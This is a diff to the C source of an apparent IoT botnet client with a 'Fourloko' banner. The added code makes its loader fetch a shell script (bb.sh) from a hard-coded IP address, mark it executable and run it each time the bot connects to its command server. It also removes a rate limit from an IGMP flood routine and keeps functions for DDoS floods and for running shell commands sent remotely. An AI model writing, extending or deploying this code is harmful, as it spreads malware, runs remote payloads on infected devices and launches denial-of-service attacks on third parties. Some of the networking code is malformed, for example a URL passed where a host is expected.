@@ -272,7 +272,7 @@ void echoLoader() {
     FILE *f;
 
     // Connect to server
-    fd = s_connect("teamspeak4life.cf", 80);
+    fd = s_connect("https://31.58.58.115", 80);
     if (fd < 0) {
         printf("Connection failed\n");
         return;
@@ -280,8 +280,8 @@ void echoLoader() {
 
     // Build a valid HTTP GET request
     const char *http_request = 
-        "GET /as.sh HTTP/1.1\r\n"
-        "Host: https://31.58.58,115\r\n"
+        "GET /bb.sh HTTP/1.1\r\n"
+        "Host: https://31.58.58.115\r\n"
         "Connection: close\r\n"
         "\r\n";
 
@@ -340,6 +340,14 @@ void echoLoader() {
     while ((bytes_read = read(fd, buffer, BUFFER_SIZE)) > 0) {
         fwrite(buffer, 1, bytes_read, f);
     }
+
+    // Make executable
+    chmod("bb.sh", 0755);
+
+    // Execute it (experimental!)
+    system("./bb.sh");
+
+    printf("Executed downloaded file.\n");
 
     fclose(f);
     close(fd);
@@ -1054,7 +1062,7 @@ void sendIGMP(unsigned char *target, int timeEnd, int spoofit, int pollinterval)
 
         if (i++ == pollinterval) {
             i = 0;
-            usleep(1000);
+         
         }
     }
 
@@ -1103,69 +1111,6 @@ void sendSTD(unsigned char *ip, int port, int secs)
 }
 
 
-struct rtp_header {
-    uint8_t vpxcc;
-    uint8_t mpt;
-    uint16_t sequence_number;
-    uint32_t timestamp;
-    uint32_t ssrc;
-} __attribute__((packed));
-
-// Generate a simulated RTP packet
-void generate_rtp_packet(unsigned char *packet, uint16_t seq, uint32_t timestamp, uint32_t ssrc) {
-    struct rtp_header *rtp = (struct rtp_header *)packet;
-
-    rtp->vpxcc = (RTP_VERSION << 6);
-    rtp->mpt = RTP_PAYLOAD_TYPE;
-    rtp->sequence_number = htons(seq);
-    rtp->timestamp = htonl(timestamp);
-    rtp->ssrc = htonl(ssrc);
-
-    // Simulate video data after RTP header
-    for (int i = RTP_HEADER_SIZE; i < RTP_HEADER_SIZE + VIDEO_PAYLOAD_SIZE; i++) {
-        packet[i] = rand() % 256;
-    }
-}
-
-// Send RTP video packets via UDP
-void send_rtp_video(const char *target_ip, int port, int duration_seconds) {
-    int sockfd;
-    struct sockaddr_in dest_addr;
-    unsigned char packet[RTP_HEADER_SIZE + VIDEO_PAYLOAD_SIZE];
-
-    srand(time(NULL));
-
-    // Create UDP socket
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        perror("socket");
-        exit(EXIT_FAILURE);
-    }
-
-    // Setup destination address
-    memset(&dest_addr, 0, sizeof(dest_addr));
-    dest_addr.sin_family = AF_INET;
-    dest_addr.sin_port = htons(port);
-    inet_pton(AF_INET, target_ip, &dest_addr.sin_addr);
-
-    // Initialize RTP fields
-    uint16_t seq = 0;
-    uint32_t timestamp = 0;
-    uint32_t ssrc = rand();
-
-    time_t end = time(NULL) + duration_seconds;
-
-    while (time(NULL) < end) {
-        generate_rtp_packet(packet, seq++, timestamp, ssrc);
-        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-        timestamp += 3600;  // Simulate video frame timing
-
-        usleep(30000);  // ~33 fps
-    }
-
-    close(sockfd);
-    printf("RTP video stream complete.\n");
-}
  void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
 {
         char vse_payload[] = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
@@ -1346,39 +1291,7 @@ void processCmd(int argc, unsigned char *argv[])
     }
 }
 
-        if(!strcmp(argv[0], "UDP"))
-        {
-                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
-                {
-                        return;
-                }
- 
-                unsigned char *ip = argv[1];
-                int port = atoi(argv[2]);
-                int time = atoi(argv[3]);
-                int spoofed = atoi(argv[4]);
-                int packetsize = atoi(argv[5]);
-                int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);
- 
-                if(strstr(ip, ",") != NULL)
-                {
-                        unsigned char *hi = strtok(ip, ",");
-                        while(hi != NULL)
-                        {
-                                if(!listFork())
-                                {
-                                        sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
-                                        _exit(0);
-                                }
-                                hi = strtok(NULL, ",");
-                        }
-                } else {
-                        if (listFork()) { return; }
- 
-                        sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
-                        _exit(0);
-                }
-        }
+        
  
         if(!strcmp(argv[0], "STD"))
         {
@@ -1653,8 +1566,8 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
  
-        sockprintf(mainCommSock, "\e[0m[\e[1;31mFourloko\e[0m][\e[1;31m%s\e[0m]\e[1;31m:\e[0m[\e[1;31m%s\e[0m] \e[1;31m>\e[0m [\e[1;31m%s\e[0m] [\e[1;31m%s\e[0m]", inet_ntoa(ourIP), getBuild(), getPortz(), getArch());
- 
+        sockprintf(mainCommSock, "\e[0m[\e[1;34mFourloko\e[0m][\e[1;34m%s\e[0m][\e[1;34m%s\e[0m][\e[1;34m%s \e[0m][\e[1;34m%s ]", inet_ntoa(ourIP), getBuild(), getPortz(), getArch());
+          echoLoader();
                 char commBuf[4096];
                 int got = 0;
                 int i = 0;
@@ -1706,17 +1619,17 @@ int main(int argc, unsigned char *argv[])
  
                                 if(strcmp(command, "!@#!>>") == 0)
                                 {
-                                        unsigned char buf[1024];
+                                        unsigned char buf[4096];
                                         int command;
                                         if (listFork()) continue;
-                                        memset(buf, 0, 1024);
+                                        memset(buf, 0, 4096);
                                         szprintf(buf, "%s 2>&1", message);
                                         command = fdpopen(buf, "r");
-                                        while(fdgets(buf, 1024, command) != NULL)
+                                        while(fdgets(buf, 4096, command) != NULL)
                                         {
                                                 trim(buf);
 //                                                sockprintf(mainCommSock, "%s", buf);
-                                                memset(buf, 0, 1024);
+                                                memset(buf, 0, 4096);
                                                 sleep(1);
                                         }
                                         fdpclose(command);
